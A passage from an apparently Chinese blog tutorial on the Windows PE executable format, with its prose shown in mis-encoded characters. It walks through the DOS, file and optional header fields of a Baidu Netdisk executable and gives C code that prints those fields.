èŠ‚è¡¨</li><li>SECTIONS - èŠ‚&#x2F;èŠ‚åŒº</li><li>OTHERS</li></ul><p>åœ¨ä¸Šé¢ç»™å‡ºçš„ç™¾åº¦ç½‘ç›˜çš„æ–‡ä»¶æ ¼å¼ä¸­ï¼Œæ‰€å±•ç°çš„å°±æ˜¯DOSå¤´+DOSå¡«å……éƒ¨åˆ†ã€‚å¯èƒ½ä½ ä¼šæœ‰ä¸ªé—®é¢˜ï¼Œå³</p><ul><li>è¿™äº›éƒ¨åˆ†æœ‰ä»€ä¹ˆå«ä¹‰ï¼Ÿ</li><li>å“ªä¸ªéƒ¨åˆ†åœ¨å“ªé‡Œå¼€å§‹å“ªé‡Œç»“æŸå‘¢ï¼Ÿ</li></ul><p>ä¸æ€¥ ï¼Œè¿™é‡Œå…ˆç»™å‡ºæ•´ä¸ªPEæ–‡ä»¶ç»“æ„çš„å›¾</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310130834634.jpg"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ä¸Šé¢é‚£ä¸ªå›¾ä¸­ï¼Œåˆå¼•ç”³å‡ºè®¸å¤šå°è¡¨ï¼Œå…¶å®è¿™äº›å°è¡¨å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªç»“æ„ä½“ï¼Œå­˜å‚¨åœ¨PEæ–‡ä»¶ç»“æ„ä¸­ã€‚å¯ä»¥è¿™ä¹ˆè¯´ï¼šPEæ–‡ä»¶ç»“æ„å°±æ˜¯ç”±è®¸è®¸å¤šå¤šçš„ç»“æ„ä½“ç»„æˆï¼Œæ¯ä¸ªç»“æ„ä½“é‡Œçš„æ¯ä¸ªæˆå‘˜éƒ½æœ‰ç›¸åº”çš„å«ä¹‰ï¼Œæ¯”å¦‚æŒ‡ç¤ºå“ªä¸ªéƒ¨åˆ†çš„å¼€å§‹ï¼Œå“ªä¸ªéƒ¨åˆ†çš„ç»“æŸï¼Œåœ¨æŒ‡æ¥æŒ‡å»çš„è¿‡ç¨‹ä¸­ï¼Œæ•´ä¸ªæ–‡ä»¶è¿è¡Œæ‰€éœ€è¦çš„ä¿¡æ¯ä¹Ÿå°±æ˜ç¡®äº†ã€‚</p><h2 id="DOSå¤´"><a href="#DOSå¤´" class="headerlink" title="DOSå¤´"></a>DOSå¤´</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹DOSå¤´éƒ¨åˆ†çš„ç»“æ„ä½“å§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//æ³¨é‡Šæ‰çš„ä¸éœ€è¦é‡ç‚¹åˆ†æ</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span>&#123;</span><br>    <span class="hljs-number">0X00</span> WORD e_magic;      <span class="hljs-comment">//â€»Magic DOS signature MZ(4Dh 5Ah):MZæ ‡è®°:ç”¨äºæ ‡è®°æ˜¯å¦æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</span><br>    <span class="hljs-comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span><br>    <span class="hljs-comment">//0X04 WORD e_cp;       //Pages in file</span><br>    <span class="hljs-comment">//0X06 WORD e_crlc;     //Relocations</span><br>    <span class="hljs-comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span><br>    <span class="hljs-comment">//0X0A WORD e_minalloc; //Minimun extra paragraphs needs</span><br>    <span class="hljs-comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span><br>    <span class="hljs-comment">//0X0E WORD e_ss;       //intial(relative)SS value</span><br>    <span class="hljs-comment">//0X10 WORD e_sp;       //intial SP value</span><br>    <span class="hljs-comment">//0X12 WORD e_csum;     //Checksum</span><br>    <span class="hljs-comment">//0X14 WORD e_ip;       //intial IP value</span><br>    <span class="hljs-comment">//0X16 WORD e_cs;       //intial(relative)CS value</span><br>    <span class="hljs-comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span><br>    <span class="hljs-comment">//0X1A WORD e_ovno;     //Overlay number</span><br>    <span class="hljs-comment">//0x1C WORD e_res[4];   //Reserved words</span><br>    <span class="hljs-comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span><br>    <span class="hljs-comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span><br>    <span class="hljs-comment">//0x28 WORD e_res2[10]; //Reserved words</span><br>    <span class="hljs-number">0x3C</span> DWORD e_lfanew;    <span class="hljs-comment">//â€»Offset to start of PE header:å®šä½PEæ–‡ä»¶ï¼ŒPEå¤´ç›¸å¯¹äºæ–‡ä»¶çš„åç§»é‡</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç®€å•ç®—ç®—ï¼Œå³æ•´ä¸ªDOSå¤´åªæœ‰0x40ä¸ªå­—èŠ‚ï¼Œé‚£å°±å¯¹æ¯”è¿™ä¸ªç»“æ„ä½“æ¥åˆ†æä¸€ä¸‹ç™¾åº¦ç½‘ç›˜çš„DOSå¤´å§</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301414772.png" alt="ç™¾åº¦ç½‘ç›˜"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// æ³¨é‡Šæ‰çš„ä¸éœ€è¦é‡ç‚¹åˆ†æ</span><br><span class="hljs-comment">// è¦æ³¨æ„å­˜å‚¨é¡ºåºä¸ºå°ç«¯åº</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span>&#123;</span><br>    <span class="hljs-number">0X00</span> WORD e_magic;      <span class="hljs-comment">// 5A 4D</span><br>    <span class="hljs-comment">//0X02 WORD e_cblp;     // 00 90</span><br>    <span class="hljs-comment">//0X04 WORD e_cp;       // 03 00</span><br>    <span class="hljs-comment">//0X06 WORD e_crlc;     // 00 00</span><br>    <span class="hljs-comment">//0X08 WORD e_cparhdr;  // 00 04</span><br>    <span class="hljs-comment">//0X0A WORD e_minalloc; // 00 00</span><br>    <span class="hljs-comment">//0X0C WORD e_maxalloc; // FF FF</span><br>    <span class="hljs-comment">//0X0E WORD e_ss;       // 00 00</span><br>    <span class="hljs-comment">//0X10 WORD e_sp;       // 00 B8</span><br>    <span class="hljs-comment">//0X12 WORD e_csum;     // 00 00</span><br>    <span class="hljs-comment">//0X14 WORD e_ip;       // 00 00</span><br>    <span class="hljs-comment">//0X16 WORD e_cs;       // 00 00</span><br>    <span class="hljs-comment">//0X18 WORD e_lfarlc;   // 00 40</span><br>    <span class="hljs-comment">//0X1A WORD e_ovno;     // 00 00</span><br>    <span class="hljs-comment">//0x1C WORD e_res[4];   // 00 00 00 00 00 00 00 00 //æ³¨æ„è¿™æ˜¯ä¸ªæ•°ç»„</span><br>    <span class="hljs-comment">//0x24 WORD e_oemid;    // 00 00</span><br>    <span class="hljs-comment">//0x26 WORD e_oeminfo;  // 00 00</span><br>    <span class="hljs-comment">//0x28 WORD e_res2[10]; // 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br>    <span class="hljs-number">0x3C</span> DWORD e_lfanew;    <span class="hljs-comment">// 00 00 01 50</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªéœ€è¦æ³¨æ„ç¬¬ä¸€ä¸ªæˆå‘˜ä»¥åŠæœ€åä¸€ä¸ªæˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜ <code>e_magic</code> æ˜¯å¯æ‰§è¡Œæ–‡ä»¶æ ‡å¿—ï¼Œåœ¨ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œä¼šé¦–å…ˆæ£€æŸ¥è¿™ä¸¤ä½æ¥åˆ¤æ–­è¿™æ˜¯ä¸æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœ€åä¸€ä¸ªæˆå‘˜<code>e_lfanew</code>å°±æ˜¯å­˜å‚¨çš„å°±æ˜¯NTå¤´çš„åœ°å€</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301429472.png"></p><p>å¯ä»¥çœ‹åˆ°<code>e_lfanew</code>æœ‰ä¸€ä¸ªç®­å¤´æŒ‡å‘äº†<code>IMAGE_NT_HEADERS</code>ï¼Œä¹Ÿå°±æ˜¯NTå¤´ã€‚</p><h2 id="NTå¤´"><a href="#NTå¤´" class="headerlink" title="NTå¤´"></a>NTå¤´</h2><p>å…ˆæ ¹æ®DOSå¤´ä¸­<code>e_lfanew</code>æ‰€æŒ‡ç¤ºçš„åœ°å€0x150ï¼Œåœ¨16è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨çœ‹çœ‹è¿™ä¸ªNTå¤´æ˜¯ä¸ªå•¥å§</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301436891.png"></p><p>æ ¹æ®ä¸Šé¢çš„PEæ–‡ä»¶ç»“æ„å›¾ï¼ŒNTå¤´åˆå¯ä»¥åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†</p><ul><li>Signature</li><li>Image_File_Header - æ ‡å‡†PEå¤´</li><li>Image_Optional_Header - å¯é€‰PEå¤´</li></ul><p>å…¶ä¸­<code>Signature</code>å 4ä¸ªå­—èŠ‚ï¼Œå³ <code>50 45 00 00 </code> åœ¨å³è¾¹ä¹Ÿå¯ä»¥çœ‹åˆ°å°±æ˜¯PEä¸¤ä¸ªå­—æ¯çš„asciiç ï¼ˆ50 45ï¼‰</p><h3 id="æ ‡å‡†PEå¤´"><a href="#æ ‡å‡†PEå¤´" class="headerlink" title="æ ‡å‡†PEå¤´"></a>æ ‡å‡†PEå¤´</h3><p>æ ‡å‡†PEå¤´å 0x14ä¸ªå­—èŠ‚ï¼Œå®ƒä¹Ÿæ˜¯ä¸ªç»“æ„ä½“ï¼Œå¦‚ä¸‹æ˜¯ä»–çš„ç»“æ„ä½“æˆå‘˜åŠç›¸å…³å«ä¹‰,å¸¦æ˜Ÿå·ä¸ºé‡è¦æˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>    WORD    Machine;               <span class="hljs-comment">// 01 4c //*å¯ä»¥è¿è¡Œåœ¨ä»€ä¹ˆæ ·çš„CPUä¸Š ä»»æ„ï¼š0 Intel 386ä»¥åŠåç»­ï¼š14C x64ï¼š8864</span><br>    WORD    NumberOfSections;      <span class="hljs-comment">// 00 09 //*è¡¨ç¤ºèŠ‚çš„æ•°é‡</span><br>    DWORD   TimeDateStamp;         <span class="hljs-comment">// 64 79 c7 10 //*ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³ï¼Œä¸æ–‡ä»¶å±æ€§é‡Œé¢çš„åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´æ— å…³</span><br>    DWORD   PointerToSymbolTable;  <span class="hljs-comment">// 00 00 00 00 //è°ƒè¯•ç›¸å…³</span><br>    DWORD   NumberOfSymbols;       <span class="hljs-comment">// 00 00 00 00 //è°ƒè¯•ç›¸å…³</span><br>    WORD    SizeOfOptionalHeader;  <span class="hljs-comment">// 00 e0 //*å¯é€‰PEå¤´çš„å¤§å°(32ä½PEæ–‡ä»¶ï¼š0xE0 64ä½PEæ–‡ä»¶ï¼š0xF0)</span><br>    WORD    Characteristics;       <span class="hljs-comment">// 01 02  //*æ–‡ä»¶å±æ€§</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></td></tr></table></figure><h3 id="å¯é€‰PEå¤´"><a href="#å¯é€‰PEå¤´" class="headerlink" title="å¯é€‰PEå¤´"></a>å¯é€‰PEå¤´</h3><p>æ ‡å‡†PEå¤´è¿‡åå°±æ˜¯å¯é€‰PEå¤´,è¿™é‡Œå°±ä»…ç»™å‡ºç»“æ„ä½“æˆå‘˜ï¼Œå¸¦æ˜Ÿå·ä¸ºé‡è¦æˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span>  <br>    WORD    Magic;  <span class="hljs-comment">//* 10B 32ä½PE 20B 64ä½PE 107 ROMæ˜ åƒ</span><br>    BYTE    MajorLinkerVersion;  <span class="hljs-comment">// é“¾æ¥å™¨ç‰ˆæœ¬å·</span><br>    BYTE    MinorLinkerVersion;  <span class="hljs-comment">// é“¾æ¥å™¨å‰¯ç‰ˆæœ¬å·</span><br>    DWORD   SizeOfCode;  <span class="hljs-comment">//* æ‰€æœ‰ä»£ç èŠ‚çš„æ€»å’Œ  å¿…é¡»æ˜¯FileAlignmentå¤§å°æ•´æ•°å€ å·²æ— ç”¨</span><br>    DWORD   SizeOfInitializedData; <span class="hljs-comment">//*  æ‰€æœ‰å«å·²åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å° å¿…é¡»æ˜¯FileAlignmentå¤§å°æ•´æ•°å€ å·²æ— ç”¨</span><br>    DWORD   SizeOfUninitializedData; <span class="hljs-comment">//* æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„å¤§å° å¿…é¡»æ˜¯FileAlignmentå¤§å°æ•´æ•°å€ å·²æ— ç”¨</span><br>    DWORD   AddressOfEntryPoint; <span class="hljs-comment">//* ç¨‹åºæ‰§è¡Œå…¥å£RVA</span><br>    DWORD   BaseOfCode; <span class="hljs-comment">//* ä»£ç èŠ‚çš„èµ·å§‹RVA å·²æ— ç”¨</span><br>    DWORD   BaseOfData; <span class="hljs-comment">//* æ•°æ®èŠ‚çš„èµ·å§‹RVA å·²æ— ç”¨</span><br>    DWORD   ImageBase;  <span class="hljs-comment">//* ç¨‹åºçš„ä¼˜å…ˆè£…è½½åœ°å€</span><br>    DWORD   SectionAlignment; <span class="hljs-comment">//* å†…å­˜ä¸­èŠ‚çš„å¯¹é½ç²’åº¦</span><br>    DWORD   FileAlignment; <span class="hljs-comment">//* æ–‡ä»¶ä¸­èŠ‚çš„å¯¹é½ç²’åº¦</span><br>    WORD    MajorOperatingSystemVersion; <span class="hljs-comment">// æ“ä½œç³»ç»Ÿä¸»ç‰ˆæœ¬å·</span><br>    WORD    MinorOperatingSystemVersion; <span class="hljs-comment">// æ“ä½œç³»ç»Ÿå‰¯ç‰ˆæœ¬å·</span><br>    WORD    MajorImageVersion;  <span class="hljs-comment">// PEæ–‡ä»¶æ˜ åƒçš„ç‰ˆæœ¬å·</span><br>    WORD    MinorImageVersion;  <br>    WORD    MajorSubsystemVersion; <span class="hljs-comment">// å­ç³»ç»Ÿçš„ç‰ˆæœ¬å·</span><br>    WORD    MinorSubsystemVersion;  <br>    DWORD   Win32VersionValue;  <span class="hljs-comment">// æœªç”¨ å¿…é¡»è®¾ç½®0</span><br>    DWORD   SizeOfImage;  <span class="hljs-comment">//* å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ åƒå°ºå¯¸ å¿…é¡»æ˜¯SectionAlignmentæ•´æ•°å€</span><br>    DWORD   SizeOfHeaders;  <span class="hljs-comment">//* æ‰€æœ‰å¤´åŒ…æ‹¬èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½ç²’åº¦åçš„å¤§å°</span><br>    DWORD   CheckSum; <span class="hljs-comment">// æ ¡éªŒå’Œ</span><br>    WORD    Subsystem; <span class="hljs-comment">// æŒ‡å®šä½¿ç”¨ç•Œé¢çš„å­ç³»ç»Ÿ</span><br>    WORD    DllCharacteristics; <span class="hljs-comment">//  DALLæ–‡ä»¶å±æ€§</span><br>    DWORD   SizeOfStackReserve; <span class="hljs-comment">// åˆå§‹åŒ–æ—¶ä¿ç•™çš„æ ˆçš„å¤§å°</span><br>    DWORD   SizeOfStackCommit; <span class="hljs-comment">//* åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆçš„å¤§å°</span><br>    DWORD   SizeOfHeapReserve; <span class="hljs-comment">//* åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †çš„å¤§å°</span><br>    DWORD   SizeOfHeapCommit; <span class="hljs-comment">//* åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †çš„å¤§å°</span><br>    DWORD   LoaderFlags; <span class="hljs-comment">// åŠ è½½æ ‡å¿—  æœªç”¨</span><br>    DWORD   NumberOfRvaAndSizes; <span class="hljs-comment">//* ä¸‹é¢çš„æ•°æ®ç›®å½•ç»“æ„çš„æ•°é‡</span><br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  <br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;  <br></code></pre></td></tr></table></figure><h4 id="RVA"><a href="#RVA" class="headerlink" title="RVA"></a>RVA</h4><p>è¿™é‡Œæåˆ°äº†å‡ ä¸ªæ–°çš„åè¯RVA,å³Relative Virual Addressï¼Œè™šæ‹Ÿç›¸å¯¹åœ°å€ã€‚</p><p>åœ¨è§£é‡Šæ­¤åè¯ä¹‹å‰ï¼Œéœ€è¦æ˜ç™½ä¸€ä»¶äº‹æƒ…ï¼Œå³PEæ–‡ä»¶å®é™…ä¸Šæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€çš„æ ·å­ï¼Œè¿˜æœ‰ä¸€ç§åˆ™æ˜¯è¿è¡Œæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿç©ºé—´ç»™å®ƒï¼Œé€šå¸¸è¿™ä¸ªè™šæ‹Ÿç©ºé—´å¤§å°æ˜¯4GBï¼Œç„¶åæŠŠè¿™ä¸ªæ–‡ä»¶è£…è½½åˆ°è¿™ä¸ª4GBä¸­ï¼Œè£…è½½åˆ°å“ªï¼Œåˆ™æ˜¯å…ˆç”±ImageBaseå­—æ®µå†³å®šï¼Œä¸€æ—¦ç¡®å®šå¥½ä»å“ªä¸ªåœ°æ–¹è£…è½½ï¼Œå°±ç›¸å½“äºç¡®å®šäº†ä¸€ä¸ªåŸºå€ï¼Œè€Œè¿™ä¸ªRVAå°±æ˜¯ç›¸å¯¹è¿™ä¸ªåŸºå€çš„åç§»ã€‚</p><p>æ¯”å¦‚è¿™ä¸ªæ–‡ä»¶ä»å†…å­˜ä¸­0x10000000å¼€å§‹è£…è½½ï¼Œå¦‚æœRVAæ˜¯0x32ï¼Œé‚£ä¹ˆåœ¨å†…å­˜ä¸­å®ƒçš„åœ°å€å°±æ˜¯0x10000032</p><h4 id="FOA"><a href="#FOA" class="headerlink" title="FOA"></a>FOA</h4><p>å¯èƒ½ä¼šæƒ³èµ·ï¼Œé‚£æˆ‘ä»¬åˆšåˆšæåˆ°çš„<code>e_lfanew</code>æ˜¯ä»€ä¹ˆåç§»ï¼Ÿï¼Œæ—¢ç„¶PEæ–‡ä»¶æœ‰ä¸¤ç§æ ¼å¼ï¼Œé‚£ä¹ˆåç§»è‚¯å®šä¹Ÿæœ‰ä¸¤ç§ï¼Œåˆšåˆšçš„æåŠçš„RVAæ˜¯åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ï¼Œé‚£ä¹ˆè¿˜æœ‰ä¸€ç§å°±æ˜¯åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼Œå³FOA - File Offset Addressï¼Œä¹Ÿå°±æ˜¯åœ¨16è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨é‡Œçš„åç§»</p><h4 id="SectionAlignment-and-FileAlignment"><a href="#SectionAlignment-and-FileAlignment" class="headerlink" title="SectionAlignment and FileAlignment"></a>SectionAlignment and FileAlignment</h4><p>SectionAlignment ï¼šåœ¨å†…å­˜é‡Œé¢èŠ‚çš„å¯¹é½å¤§å°ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªçš„æ•´æ•°å€</p><p>FileAlignmentï¼šåœ¨æ–‡ä»¶é‡Œé¢èŠ‚çš„å¯¹é½å¤§å°ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªçš„æ•´æ•°å€</p><h2 id="ä½¿ç”¨ä»£ç è¯»å–"><a href="#ä½¿ç”¨ä»£ç è¯»å–" class="headerlink" title="ä½¿ç”¨ä»£ç è¯»å–"></a>ä½¿ç”¨ä»£ç è¯»å–</h2><p>å¾—ç›Šäºå¾®è½¯çš„å†…ç½®åº“ï¼Œå¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ä»¥åŠå®šä¹‰å¥½çš„æŒ‡é’ˆç±»å‹æ¥è¯»å–ï¼Œè€Œä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨è®¡ç®—</p><p>å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæ˜¯æ–‡ä»¶è¯»å…¥å†…å­˜ä¸­ï¼Œå› æ­¤æ–‡ä»¶åœ¨å†…å­˜ä¸­ç›¸å½“äºæ˜¯æœ‰ä¸€ä¸ªåŸºå€çš„ï¼Œæ‰€ä»¥éœ€è¦buffer+FOAã€‚æ³¨æ„è¿™é‡Œæ˜¯æŠŠæ–‡ä»¶åŸå°ä¸åŠ¨çš„è¯»å…¥ç¨‹åºå†…å­˜ï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶æ‹‰ä¼¸è¿›å†…å­˜ã€‚</p><p>å¯ä»¥ä½¿ç”¨ç½‘ä¸Šçš„ä¸€äº›PEæŸ¥çœ‹å™¨æ¥éªŒè¯è‡ªå·±æ˜¯å¦è¯»å‡ºæ­£ç¡®æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PE_info</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)(buffer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================DosHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DOS_HEADER e_magic:%X\n&quot;</span>,DosHeader-&gt;e_magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DOS_HEADER e_lfanew:%X\n&quot;</span>,DosHeader-&gt;e_lfanew);<br>    <br><br>    NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================NTHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMAGE_DOS_SIGNATURE:%X\n&quot;</span>,*(PDWORD)NTHeader);<br><br>    FILEHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================FileHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Machine:%X\n&quot;</span>, FILEHeader-&gt;Machine);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of Sections:%X\n&quot;</span>, FILEHeader-&gt;NumberOfSections);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of OptionalHeader:%X\n&quot;</span>, FILEHeader-&gt;SizeOfOptionalHeader);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Time Stamp:%X\n&quot;</span>, FILEHeader-&gt;TimeDateStamp);<br><br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================Optional PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Magic:%X\n&quot;</span>, OptionalHeader-&gt;Magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address of EntryPoint:%X\n&quot;</span>, OptionalHeader-&gt;AddressOfEntryPoint);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ImageBase:%X\n&quot;</span>, OptionalHeader-&gt;ImageBase);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfImage:%X\n&quot;</span>, OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfHeaders:%X\n&quot;</span>, OptionalHeader-&gt;SizeOfHeaders);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;YOU PATH TO EXE 